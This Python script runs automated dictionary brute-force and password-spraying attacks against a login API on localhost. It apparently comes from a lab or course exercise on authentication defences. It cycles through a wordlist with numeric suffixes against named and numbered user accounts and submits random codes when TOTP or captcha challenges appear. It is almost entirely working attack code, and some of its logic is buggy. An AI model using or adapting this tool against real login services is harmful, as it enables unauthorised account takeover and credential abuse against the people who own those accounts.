import requests
import json
import time
import secrets
import string
import os


LOCAL_ADDRESS = 'http://127.0.0.1:8000'
DO_PASSWORD_SPARYING = 0
GROUP = 31
FIRST_USER = 1

def load_common_password():
    base_dir = os.path.dirname(__file__)
    path = os.path.join(base_dir, 'dictionary_attack.txt')
    with open(path, 'r') as file:
        return file.read().splitlines()


def post(username, password, session, code, type):

    # Post to the login endpoint
    if type == "totp":
        url = f"{LOCAL_ADDRESS}/api/login_totp"
        data = {
        'username': username,
        'password': password,
        'totp_code': code or '',
        'captch_code': ''
        }
    else:
        url = f"{LOCAL_ADDRESS}/api/login"
        data = {
        'username': username,
        'password': password,
        'totp_code': '',
        'captch_code': code or ''
        } 

    try:
        response = session.post(url, json=data)
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        return None

    print(f"Status Code: {response.status_code}")
    # Only attempt to parse JSON if the response reports JSON
    content_type = response.headers.get('Content-Type', '')
    if 'application/json' in content_type:
        try:
            print(username, password, code)
            return response.status_code, json.dumps(response.text)
        except ValueError:
            print("Response said JSON but could not parse it")
    else:
        print(username, password, code)
    return response.status_code, response.text


def start_brute_force():
    for u in ["user2", "user16", "user29"]:
        try:
            if brute_force(u):
                print("hacked!")
        except Exception as e:
            print("EXCEPTION:", e)
            print('error in sending info to the server')


def brute_force(username):
    common_passwords = load_common_password()
    print("passwords loaded")
    start_time = time.time()  
    max_attempts = 1000000    
    max_seconds = 2 * 3600   # 2 hours in secs
    attempt_count = 0
    session = requests.Session()
    print("starting session")
    type = "login"
    code = ""
    i = 0 
    answer = 0

    while answer != 200 and i < len(common_passwords):
        password = common_passwords[i]
        
        #check attempts limit
        if attempt_count >= max_attempts:
            print("Reached maximum attempts limit.")
            break
        
        #check time limit
        elapsed_time = time.time() - start_time
        if elapsed_time >= max_seconds:
            print("Reached time limit (2 hours).")
            break
        
        #check password without suffix
        print(password, username)
        answer = post(username, password, session, code, type)
        print(answer)
        attempt_count += 1

        if answer[0] == 200:
            return 1
        if answer[0] == 403 and "totp" in answer[1]:
            type = "totp"
            code = generate_code()
        elif answer[0] == 403 and "captcha" in answer[1]:
            type = "captcha"
            i += 1
            code = generate_code()
        else:
            i += 1

        if not password.isdigit():
            #check password with suffix
            for length in [1, 2]:
                for j in range(10**length):
                    suffix = f"{j:0{length}}"
                    current_password = password + suffix
                    answer = post(username, current_password, session, code, type)
                    attempt_count += 1 

                    if answer[0] == 200:
                        return 1
                    if answer[0] == 403 and "totp" in answer[1]:
                        type = "totp"
                        code = generate_code()
                    elif answer[0] == 403 and "captcha" in answer[1]:
                        type = "captcha"
                        i += 1
                        code = generate_code()
                    else:
                        i += 1
                    
    if answer == 200:
        return 1       
    return 0


def start_password_spraying():
    #repeated code need to fix
    start_time = time.time()  
    attempt_count = 0
    session = requests.Session()
    common_passwords = load_common_password()


    for password in common_passwords:
        try:
            result = password_sparying(password, session, start_time, attempt_count)
            if result[0]:
                print("hacked!")
                break
            else:
                attempt_count = result[1]
            
            if not password.isdigit():
            #check password with suffix
                for length in [1, 2]:
                    for i in range(10**length):
                        suffix = f"{i:0{length}}"
                        current_password = password + suffix
                        result = password_sparying(current_password, session, start_time, attempt_count)
                        if result[0]:
                            break
                        else:
                            attempt_count = result[1]
                            
        except Exception as e:
            print("EXCEPTION:", e)
            print('error in sending info to the server')
            break


def password_sparying(password, session, start_time,attempt_count):
    max_attempts = 1000000    
    max_seconds = 2 * 3600   # 2 hours in secs
    #endpoint = "login"
    code = None
    type = None
    i = FIRST_USER
    answer = 0
    while answer != 200 and i < GROUP:
        #check attempts limit
        if attempt_count >= max_attempts:
            print("Reached maximum attempts limit.")
            break
        
        #check time limit
        elapsed_time = time.time() - start_time
        if elapsed_time >= max_seconds:
            print("Reached time limit (2 hours).")
            break

        answer = post(f'user{i}', password, session,code, type)

        attempt_count += 1 

        if answer[0] == 403 and "totp" in answer[1]:
            type = "totp"
            code = generate_code()
        elif answer[0] == 403 and "captcha" in answer[1]:
            type = "captcha"
            i += 1
            code = generate_code()
        else:
            i += 1

    if answer == 200:
            return (1, attempt_count)
    
    return (0, attempt_count)


def generate_code():
    length = 6
    allowed_characters = string.ascii_uppercase + string.digits
    otp = ''.join(secrets.choice(allowed_characters) for _ in range(length))
    return otp


def main():
    if DO_PASSWORD_SPARYING:
        start_password_spraying()
    start_brute_force()


if __name__ == '__main__':
    main()